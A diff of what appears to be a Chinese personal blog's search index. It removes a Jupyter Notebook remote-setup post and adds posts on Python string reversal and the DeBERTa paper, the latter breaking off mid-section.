-    <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
-<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p>
-<h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p>
-<h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p>
-<h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
-<h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
-<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SSH端口转发</title>
     <url>/2020/01/02/ssh-tips/</url>
     <content><![CDATA[<p>平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！<a id="more"></a></p>
@@ -804,20 +787,17 @@
       </categories>
   </entry>
   <entry>
-    <title>Sublime中按ctrl+B调用python3运行</title>
-    <url>/2019/07/23/sublime-run/</url>
-    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
-<p>解决办法如下：</p>
-<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
-<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
-<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
-<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
-<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
-<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
-<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
-<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
+    <title>Python实现字符串反转的几种方法</title>
+    <url>/2019/11/15/py-str-reverse/</url>
+    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
+<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
+<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line">		<span class="hljs-keyword">return</span> s</span><br><span class="line">	<span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
+<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	<span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">		<span class="hljs-comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
+<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -841,6 +821,26 @@
 <li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Sublime中按ctrl+B调用python3运行</title>
+    <url>/2019/07/23/sublime-run/</url>
+    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
+<p>解决办法如下：</p>
+<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
+<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
+<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
+<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
+<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
+<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
+<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
+<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -1323,6 +1323,145 @@
 ]]></content>
       <categories>
         <category>LeetCode系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DeBERTa 论文解读</title>
+    <url>/2021/11/24/deberta/</url>
+    <content><![CDATA[<p style="text-indent:2em">
+《Deberta: decoding-Enhanced Bert with Disentangled Attention》，该论文来自 ICLR2021，作者团队为微软，主要介绍了其提出的一个新的预训练语言模型：DeBERTa，该模型从注意力解耦（disentangled attention）和预训练阶段的解码增强两方面对BERT类预训练模型进行了优化，并在SuperGLUE上首次超越人类基准。</p><a id="more"></a>
+
+<p><a href="https://openreview.net/pdf?id=XPZIaotutsD" target="_blank" rel="noopener">论文地址</a>、<a href="https://github.com/microsoft/DeBERTa" target="_blank" rel="noopener">代码地址</a></p>
+<h3 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h3><p style="text-indent:2em">
+这篇文章的创新点主要在三个部分：1.使用了解耦的注意力机制；2.对预训练阶段的MLM任务的Decoder层进行了改进；3.训练技巧（虚拟对抗训练）</p>
+
+<h4 id="1-解耦的注意力机制"><a href="#1-解耦的注意力机制" class="headerlink" title="1. 解耦的注意力机制"></a>1. 解耦的注意力机制</h4><p style="text-indent:2em">
+我们回想 Transformer 的结构，对于一个 token 的表示，是在其 word embedding 的基础上加上 position embedding 所构成的。当然 Vaswani 的 Transformer 对于位置嵌入使用的是绝对位置编码，这种方法饱受质疑，后续又出现了相对位置编码等等。而BERT也是如此，其 word embedding 为 token embedding, position embedding 和 segment embedding 三者的相加。</p>
+
+<p><img src="/2021/11/24/deberta/bert_input.png" alt="bert_input.png"></p>
+<p style="text-indent:2em">
+而本文提出的解耦的注意力机制（disentangled attention mechanism）对于位置嵌入的处理方式与上述不同，即不再是在编码阶段简单的将内容嵌入与位置嵌入进行简单的相加作为一个字或词的表示，而是将一个 token 的表示分为两个向量，一个为 content embedding，另一个为 position embedding，二者分别进行注意力计算，之后再进行相加，因此称作解耦的注意力机制。
+</p>
+
+<h4 id="2-Enhanced-Mask-Decoder"><a href="#2-Enhanced-Mask-Decoder" class="headerlink" title="2. Enhanced Mask Decoder"></a>2. Enhanced Mask Decoder</h4><p style="text-indent:2em">
+像 BERT 一样，DeBERTa 在预训练阶段也使用了 Masked Language Modeling（MLM），MLM 其实是一个完形填空任务，需要让模型对于被 mask 掉的位置预测出其原本的单词。但原本的 BERT 中的预测部分，也就是解码部分只有一个简单的 softmax 层，但我们在进行后续下游任务的微调时候，一般都会加一个用于特定任务的解码器，因此本文提出了一个 Enhanced Mask Decoder（EMD）用于预训练阶段，为的就是缓解预训练任务与微调之间的不匹配。
+</p>
+
+<h4 id="3-SiFT"><a href="#3-SiFT" class="headerlink" title="3. SiFT"></a>3. SiFT</h4><p style="text-indent:2em">
+感觉这算是一个微调的训练技巧吧，作者针对虚拟对抗训练（virtual adversarial training）进行了小部分的调整，新方法称为 Scale-invariant-Fine-Tuning（SiFT）。在针对将预训练模型用于下游任务的Fine-tune阶段加入 SiFT 可以增强模型的泛化性。
+</p>
+
+<h3 id="二、Background"><a href="#二、Background" class="headerlink" title="二、Background"></a>二、Background</h3><p>说实话背景这一块内容并不多，也没有什么值得介绍的，一共就两个，第一个就是目前各大预训练语言模型所使用的 Transformer 模型结构，另一个就是 MLM。关于 Transformer，可以看我的<a href="https://aestheticisma.github.io/2021/10/11/transformer/" target="_blank" rel="noopener">上一篇文章</a>，下面简单用语言和数学公式描述下 MLM：</p>
+<p style="text-indent:2em">
+对于给定一个序列 $ \textit{X} = \lbrace x_i \rbrace $，我们通过随机 mask 掉其 15% 的 tokens，将 $\textit{X}$ 变为 $\tilde{X}$，训练一个模型，模型参数集合为 $\theta$，我们让模型基于 $\tilde{X}$ 来预测被 mask 掉的 $\tilde{x}$，数学描述为：$$ \mathop{max}\limits_{\theta}logp_{\theta}(\textit{X} | \tilde{X}) = \mathop{max}\limits_{\theta}\sum\limits_{i\in\mathcal{C}}logp_{\theta}(\tilde{x_i} = x_i | \tilde{X}) \tag{1}$$
+$\mathcal{C}$代表序列中被 mask 掉的 token 的索引，当然这里就不具体展开具体 mask 的规则了。
+</p>
+
+<h3 id="三、Model-Architecture"><a href="#三、Model-Architecture" class="headerlink" title="三、Model Architecture"></a>三、Model Architecture</h3><p style="text-indent:2em">
+在这一部分，我们详细介绍一下这篇论文所提出的 DeBERTa 的模型结构，主要分为 Disentangled Attention 和 Enhanced Mask Decoder(EMD) 两个部分。
+</p>
+
+<h4 id="1-Disentangled-Attention"><a href="#1-Disentangled-Attention" class="headerlink" title="1. Disentangled Attention"></a>1. Disentangled Attention</h4><p style="text-indent:2em">
+如前所述，所谓解耦的注意力机制，即是将词嵌入解耦为内容嵌入和位置嵌入两个向量，文中小标题这么来概括它："A Two-Vector Approach to Content and Position Embedding"。那么具体是怎么做的呢？
+</p>
+
+<p style="text-indent:2em">
+对于一个序列中位置为 $i$ 的 token $x_i$，我们用 $\lbrace \textit{H}_i \rbrace$ 和 $\lbrace \textit{P}_{i|j} \rbrace $ 两个向量来表示它，前者代表它的内容（content）嵌入，后者代表它关于序列中位置为 $j$ 的 token $x_j$ 的相对位置（relative position）嵌入。在之前我们都是将两个向量相加得到的一个和向量作为 token 的编码表示，但现在我们换一个玩法，我们将 content 和 position 看作独立的个体，让他们都参与到 attention 的计算过程中，那么也就得到了下面的公式：$$ \textit{A}_{i, j} =  \lbrace \textit{H}_i, \textit{P}_{i|j} \rbrace \times {\lbrace \textit{H}_j, \textit{P}_{j|i} \rbrace}^{T} \\ = \textit{H}_i\textit{H}_j^{T} + \textit{H}_i\textit{P}_{j|i}^{T} + \textit{P}_{i|j}\textit{H}_j^{T} + \textit{P}_{i|j}\textit{P}_{j|i}^{T} \tag{2}$$
+</p>
+
+<p style="text-indent:2em">
+如公式（2）所示，使用注意力解耦的方法可以将一个 word pair 的 attention 权重看作四个分量的和：content-to-content, content-to-position, position-to-content 和 position-to-position。在这里作者指出，现有的相对位置嵌入的方法<sup>[1]</sup>只在 Attention 计算时用了分离的 Embedding 矩阵，这种做法相当于只用到了前面提到的四个分量中的前两个。但作者认为一个 word pair 之间的 attention 权重不仅依赖于其 content，它们之间的相对位置关系也至关重要，因此加入了第三个分量，也就是 position-to-content。最后丢弃了第四个分量（因为已经是相对位置关系了，位置和位置之间的关系已经提供不了额外的信息了，所以丢弃了这个分量）。
+</p>
+
+<p style="text-indent:2em">
+在这里我觉得有必要简单介绍一下Shaw等人<sup>[1]</sup>提出的在 Transformer 中使用相对位置嵌入的方法。我们将输入的序列 $ \textit{X} $ 看作一个有向全连接图，对于 $ \textit{X} $ 中的元素 $x_i$ 和 $x_j$ 之间的边通过两个向量 $a_{ij}^K, a_{ij}^V \in \mathbb{R}^{d_a}$ 来表示，并且这些向量在多个 head 之间共享，$d_a = d_z$。通过引入边的特征表示，将 Vaswani 类 Transformer 中的 self-attention 计算方式修改为：
+$$ z_i = \sum_{j=1}^n\alpha_{ij}(x_jW^V + a_{ij}^V) $$
+$$ \alpha_{ij} = \frac{\text{exp}\ e_{ij}}{\sum_{k=1}^n\text{exp}\ e_{i,k}} $$
+$$ e_{ij} = \frac{x_iW^Q(x_jW^K + a_{ij}^K)^T}{\sqrt{d_k}} $$
+</p>
+<p style="text-indent:2em">
+而 $ a_{ij}^K $ 和 $ a_{ij}^V $ 通过以下公式得出：
+$$ a_{ij}^K = W_{clip(j-i, k)^K} $$
+$$ a_{ij}^V = W_{clip(j-i, k)^V} $$
+$$ clip(x, k) = max(-k, min(x, k)) \tag{3}$$
+文中提及的已经存在的相对位置嵌入的方法就介绍到这里，下面继续介绍本篇文章提出的 Disentangled Attention。
+</p>
+
+<p style="text-indent:2em">
+上接公式（2），我们取其前三个分量作为注意力权重，首先回顾一下标准的单头（single head）自注意力（self-attention）运算<sup>[2]</sup>。
+$$ Q = HW_q,\ K = HW_k,\ V = HW_v,\ A = \frac{QK^T}{\sqrt{d}} $$
+$$ H_o = softmax(A)V $$
+$ H \in \mathbb{R}^{N \times d} $ 表示输入的隐层向量，$ H_o \in \mathbb{R}^{N \times d} $ 表示 self-attention 的输出，$ W_q,\ W_k,\ W_v \in \mathbb{R}^{d \times d} $，N代表输入序列的长度。
+</p>
+
+<p style="text-indent:2em">
+前面提到，在本篇论文中一个 token 的表示分别用 content 和 position 两个向量表示，因此使用了两套 Q和K，下面用 $Q_c,\ K_c,\ V_c$ 表示关于 content 的矩阵，$Q_r,\ K_r$ 表示关于 position 的矩阵。同时，$W_{q, c},\ W_{k, c},\ W_{v, c} \in \mathbb{R}^{d \times d} $ 用来表示关于 content 的 projection matrices，$W_{q, r},\ W_{k, r} \in \mathbb{R}^{d \times d}$ 用来表示关于 position 的 projection matrices。额外的，定义了一个用于存储位置嵌入的矩阵 $ P \in \mathbb{R}^{2k \times d} $。那么可以得到如下几个公式：
+$$ Q_c = HW_{q,c},\ K_c = HW_{k,c},\ V_c = HW_{v,c},\ Q_r = PW_{q,r},\ K_r = PW_{k,r} $$
+$$ \tilde{A}_{i,j} = \underbrace{Q_i^c{K_j^c}^T}_{(a)content-to-content} + \underbrace{Q_i^c{K_{\delta(i,j)}^r}^T}_{(b)content-to-position} + \underbrace{K_j^c{Q_{\delta(j,i)}^r}^T}_{(c)position-to-content} $$
+$$ H_o = softmax(\frac{\tilde{A}}{\sqrt{3d}})V_c $$
+</p>
+
+<p style="text-indent:2em">
+说实话，第三个分量不用 $\delta(i,j)$ 而是 $\delta(j,i)$ 我没有想明白为什么，论文中关于它的解释只有一句话：This is because for a given position
+i, position-to-content computes the attention weight of the key content at j with respect to the
+query position at i, thus the relative distance is $\delta(j,i)$. $\delta(i,j)$ 的计算公式如下：
+$$ \delta(i,j) = \begin{cases} 0 & \text{for $i-j\leq-k$} \\
+                    2k-1 & \text{for $i-j\geq k$} \\
+                    i-j+k & \text{others.} \end{cases}$$
+</p>
+
+<p style="text-indent:2em">
+除此之外，具体实现的时候，作者并没有像[1]中一样存储了所有的相对位置编码（需要 $O(N^2d)$ 的空间复杂度），而是只是存储了上述的 $P \in \mathbb{R}^{2k \times d}$，也可以理解为存储了 $K^r \in \mathbb{R}^{2k \times d}$ 和 $Q_r \in \mathbb{R}^{2k \times d} $，由于最后的 $\delta(i,j)$ 函数计算的值域其实是 [0, 2k-1] 的，因此在矩阵乘法计算完成后，通过索引取相应位置的结果即可，从而空间复杂度降低到了 $O(kd)$。
+</p>
+
+<h4 id="2-Enhanced-Mask-Decoder-EMD"><a href="#2-Enhanced-Mask-Decoder-EMD" class="headerlink" title="2. Enhanced Mask Decoder(EMD)"></a>2. Enhanced Mask Decoder(EMD)</h4><p style="text-indent:2em">
+在这一部分作者首先通过一个例子: "a new <strong>store</strong> opened beside the new <strong>mall</strong>." 引出主旨，我们让预训练模型通过 MLM 去预测单词 “store” 和 “mall”，但这两个单词的部分上下文信息（这里指相对位置和周围词）是相同的，比如都位于“new”这个单词的后面且与其相对位置相同，因此这就给模型区分两个单词造成了困难，但这句话的主语是“store”而不是“mall”，因此作者认为绝对位置信息也是很重要的。但在 BERT 中，绝对位置信息是加在序列的输入向量中的，在这里我们已经修改成了相对位置信息，那么还怎么把绝对位置信息加入进去呢？既然我们这里的绝对位置信息是为了让 MLM 更好的预测被 mask 掉的单词，那作者就将绝对位置信息加在了最后 softmax 之前（准确的说是之前的解码器的输入上）。
+</p>
+
+<p style="text-indent:2em">
+除了绝对位置信息之外，作者还认为对于特定的下游任务，我们一般会在预训练模型后面加一个关于特定任务的解码器，但是预训练阶段的 MLM 却只有一个softmax层（除了前面那一些 dense 和 LN），这难免会造成一些不匹配，因此将原来的只有 softmax 层变成了两层的 transformer encoder layer + softmax。如下图所示：
+</p>
+
+<p><img src="/2021/11/24/deberta/decoder_layer.png" alt="decoder_layer"></p>
+<p style="text-indent:2em">
